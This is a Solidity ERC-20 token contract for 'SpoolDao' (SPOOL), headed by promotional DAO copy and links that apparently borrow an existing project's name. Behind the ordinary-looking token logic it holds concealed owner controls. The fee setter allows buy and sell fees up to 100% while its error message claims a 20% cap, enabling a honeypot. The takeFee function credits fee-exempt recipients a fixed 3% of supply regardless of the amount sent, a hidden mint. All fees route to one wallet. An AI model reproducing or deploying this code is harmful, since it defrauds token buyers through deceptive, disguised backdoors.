// SPDX-License-Identifier: MIT

/*
Spool is a DAO. Unseen by the masses, we work tirelessly in the background to ensure that our users always have access to the best risk adjusted yield available while fueling protocols with the liquidity they need. Spool is a benevolent entity that ensures the growth and wellbeing of DeFi as a whole.

Website: https://www.spooldao.org
Telegram: https://t.me/SpoolDao
Twitter: https://twitter.com/spooldao
Dapp: https://app.spooldao.org
*/

pragma solidity 0.8.21;

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }
    event OwnershipTransferred(address owner);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IDEXFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract SPOOLSPOOL is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"SpoolDao";
    string private constant _symbol = unicode"SPOOL";
    uint8 private constant _decimals = 9;
    uint256 private _supply = 1000000000 * (10 ** _decimals);
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExemptFromFee;
    IDEXRouter router;
    address public pair;
    bool private tradingenabled = false;
    bool private swapEnabled = true;
    uint256 private feeSwapcount;
    bool private inswap;
    uint256 tasSwapThreshold;
    uint256 private _maxFeeSwap = ( _supply * 1000 ) / 100000;
    uint256 private _minFeeswap = ( _supply * 10 ) / 100000;
    modifier lockSwap {inswap = true; _; inswap = false;}
    uint256 public maxTrxnAmount = ( _supply * 300 ) / 10000;
    uint256 public maxTransferAmount = ( _supply * 300 ) / 10000;
    uint256 public maxWalletAmount = ( _supply * 300 ) / 10000;
    uint256 private lpTax = 0;
    uint256 private marketingTax = 0;
    uint256 private devTax = 100;
    uint256 private burntax = 0;
    uint256 private buyTax = 1300;
    uint256 private sellFee = 1300;
    uint256 private transferFee = 1300;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal marketingAddr = 0xdb9fF7Adb040CFe2083AC6047AC9fb6D88956dfD;
    address internal lpProviderAddr = 0xdb9fF7Adb040CFe2083AC6047AC9fb6D88956dfD;
    address internal devFeeAddr = 0xdb9fF7Adb040CFe2083AC6047AC9fb6D88956dfD; 

    constructor() Ownable(msg.sender) {
        IDEXRouter _router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IDEXFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pair = _pair;
        isExemptFromFee[devFeeAddr] = true;
        isExemptFromFee[lpProviderAddr] = true;
        isExemptFromFee[marketingAddr] = true;
        isExemptFromFee[msg.sender] = true;
        _balances[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, _supply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function startTrading() external onlyOwner {tradingenabled = true;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _supply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        lpTax = _liquidity; marketingTax = _marketing; burntax = _burn; devTax = _development; buyTax = _total; sellFee = _sell; transferFee = _trans;
        require(buyTax <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "buyTax and sellFee cannot be more than 20%");
    }

    function setContractSwapSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
        tasSwapThreshold = _swapAmount; _maxFeeSwap = _supply.mul(_swapThreshold).div(uint256(100000)); 
        _minFeeswap = _supply.mul(_minTokenAmount).div(uint256(100000));
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isExemptFromFee[sender] && !isExemptFromFee[recipient];
    }
    function swapandliquidify(uint256 tokens) private lockSwap {
        uint256 _denominator = (lpTax.add(1).add(marketingTax).add(devTax)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(lpTax).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(lpTax));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(lpTax);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingTax);
        if(marketingAmt > 0){payable(marketingAddr).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devFeeAddr).transfer(contractBalance);}
    }

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supply.mul(_buy).div(10000); uint256 newTransfer = _supply.mul(_sell).div(10000); uint256 newWallet = _supply.mul(_wallet).div(10000);
        maxTrxnAmount = newTx; maxTransferAmount = newTransfer; maxWalletAmount = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function shouldTaxSwapFee(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= _minFeeswap;
        bool aboveThreshold = balanceOf(address(this)) >= _maxFeeSwap;
        return !inswap && swapEnabled && tradingenabled && aboveMin && !isExemptFromFee[sender] && recipient == pair && feeSwapcount >= tasSwapThreshold && aboveThreshold;
    }
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExemptFromFee[sender] && !isExemptFromFee[recipient]){require(tradingenabled, "tradingenabled");}
        if(!isExemptFromFee[sender] && !isExemptFromFee[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= maxWalletAmount, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= maxTransferAmount || isExemptFromFee[sender] || isExemptFromFee[recipient], "TX Limit Exceeded");}
        require(amount <= maxTrxnAmount || isExemptFromFee[sender] || isExemptFromFee[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !isExemptFromFee[sender]){feeSwapcount += uint256(1);}
        if(shouldTaxSwapFee(sender, recipient, amount)){swapandliquidify(_maxFeeSwap); feeSwapcount = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExemptFromFee[sender] ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpProviderAddr,
            block.timestamp);
    }

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair){return buyTax;}
        return transferFee;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExemptFromFee[recipient]) {return maxTrxnAmount;}
        if(getTotalFee(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burntax > uint256(0) && getTotalFee(sender, recipient) > burntax){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burntax));}
        return amount.sub(feeAmount);} return amount;
    }
}